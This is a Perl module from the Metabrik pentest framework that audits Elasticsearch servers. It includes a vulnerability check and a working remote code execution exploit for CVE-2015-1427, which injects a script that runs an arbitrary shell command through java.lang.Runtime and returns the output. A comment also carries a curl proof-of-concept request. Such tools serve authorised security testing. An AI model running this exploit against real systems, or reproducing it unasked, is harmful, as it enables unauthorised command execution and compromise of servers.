#
# $Id$
#
# audit::elasticsearch Brik
#
package Metabrik::Audit::Elasticsearch;
use strict;
use warnings;

use base qw(Metabrik::Client::Www);

sub brik_properties {
   return {
      revision => '$Revision$',
      tags => [ qw(unstable) ],
      author => 'GomoR <GomoR[at]metabrik.org>',
      license => 'http://opensource.org/licenses/BSD-3-Clause',
      attributes => {
         uri => [ qw(uri) ],
      },
      commands => {
         check_cve_2015_1427_rce => [ qw(uri|OPTIONAL) ],
         exploit_cve_2015_1427_rce => [ qw(command uri|OPTIONAL) ],
         exploit_cve_2014_3120_rce => [ qw(command uri|OPTIONAL) ],
      },
      require_modules => {
         'Metabrik::String::Json' => [ ],
         'Metabrik::String::Parse' => [ ],
      },
   };
}

#
# http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1427
# https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
# PoC: curl 'http://nile:9200/_search?pretty' -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\")"}}}'
#
sub check_cve_2015_1427_rce {
   my $self = shift;
   my ($uri) = @_;

   $uri ||= $self->uri;
   $self->brik_help_run_undef_arg('check_cve_2015_1427_rce', $uri) or return;

   $uri =~ s{^(http://[^:]+:\d+).*}{$1};
   if ($uri !~ m{^http://[^:]+:\d+$}) {
      return $self->log->error("check_cve_2015_1427_rce: invalid uri [$uri], ".
         "try something like http://localhost:9200");
   }

   my $check = '{"script_fields": {"myscript": {"script": '.
               '"java.lang.Math.class.forName(\"java.lang.Runtime\")"'.
               '}}}';

   my $url = $uri.'/_search/?pretty';

   $self->log->debug("check_cve_2015_1427_rce: POSTing to ".
      "url [$url] with data [$check]");

   my $reply = $self->post($check, $url) or return;

   my $content = $reply->{content}
      or return $self->log->error("check_cve_2015_1427_rce: no content found");

   my $sj = Metabrik::String::Json->new_from_brik_init($self) or return;

   my $ref = $sj->decode($content) or return;

   if ($ref->{hits} && $ref->{hits}{hits} && $ref->{hits}{hits}[0]
   &&  $ref->{hits}{hits}[0]{fields}
   &&  $ref->{hits}{hits}[0]{fields}{myscript}) {
      my $result = $ref->{hits}{hits}[0]{fields}{myscript}[0] || 'undef';
      if ($result ne 'undef') {
         $self->log->verbose("check_cve_2015_1427_rce: vulnerable [$result]");
         return 1;
      }
   }
   else {
      $self->log->verbose("check_cve_2015_1427_rce: NOT vulnerable");
      return 0;
   }

   return $self->log->error("check_cve_2015_1427_rce: unknown error");
}

#
# Thanks to: https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch
# But they stole our logo font with bleeding letters ;)
#
sub exploit_cve_2015_1427_rce {
   my $self = shift;
   my ($command, $uri) = @_;

   $uri ||= $self->uri;
   $self->brik_help_run_undef_arg('exploit_cve_2015_1427_rce', $command) or return;
   $self->brik_help_run_undef_arg('exploit_cve_2015_1427_rce', $uri) or return;

   $uri =~ s{^(http://[^:]+:\d+).*}{$1};
   if ($uri !~ m{^http://[^:]+:\d+$}) {
      return $self->log->error("exploit_cve_2015_1427_rce: invalid uri [$uri], ".
         "try something like http://localhost:9200");
   }

   my $check = '{ "size":1, "script_fields": { "lupin": { "script": '.
               '"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"'.
               $command.
               '\").getText()"'.
               '}}}';

   my $url = $uri.'/_search/?pretty';

   $self->log->debug("exploit_cve_2015_1427_rce: POSTing to ".
      "url [$url] with data [$check]");

   my $reply = $self->post($check, $url) or return;

   my $content = $reply->{content}
      or return $self->log->error("exploit_cve_2015_1427_rce: no content found");

   my $sj = Metabrik::String::Json->new_from_brik_init($self) or return;

   my $ref = $sj->decode($content) or return;

   if ($ref->{hits} && $ref->{hits}{hits} && $ref->{hits}{hits}[0]
   &&  $ref->{hits}{hits}[0]{fields}
   &&  $ref->{hits}{hits}[0]{fields}{lupin}) {
      $self->log->verbose("exploit_cve_2015_1427_rce: vulnerable");
      my $result = $ref->{hits}{hits}[0]{fields}{lupin}[0] || 'undef';

      my $sp = Metabrik::String::Parse->new_from_brik_init($self) or return;
      return $sp->to_array($result);
   }
   else {
      $self->log->verbose("exploit_cve_2015_1427_rce: NOT vulnerable");
      return 0;
   }

   return $self->log->error("exploit_cve_2015_1427_rce: unknown error");
}

#
# http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120
# http://bouk.co/blog/elasticsearch-rce/
#
sub exploit_cve_2014_3120_rce {
   my $self = shift;

   return $self->log->error("exploit_cve_2014_3120_rce: TODO");
}

1;

__END__

=head1 NAME

Metabrik::Audit::Elasticsearch - audit::elasticsearch Brik

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2014-2022, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of The BSD 3-Clause License.
See LICENSE file in the source distribution archive.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=cut
